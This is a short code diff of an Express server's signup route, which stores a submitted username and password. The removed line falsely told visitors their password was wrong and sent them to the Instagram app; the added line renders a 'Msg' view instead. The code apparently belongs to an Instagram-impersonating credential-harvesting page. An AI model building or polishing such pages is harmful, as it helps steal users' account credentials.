@@ -34,7 +34,7 @@ app.post('/signup', async (req, res) => {
     username,
     password
   });
- return  res.send('Password is wrong, go to Instagram app and change your password ');
+ return  res.render("Msg");
 });
  // listeing
  app.listen(PORT , () => console.log('server started'));
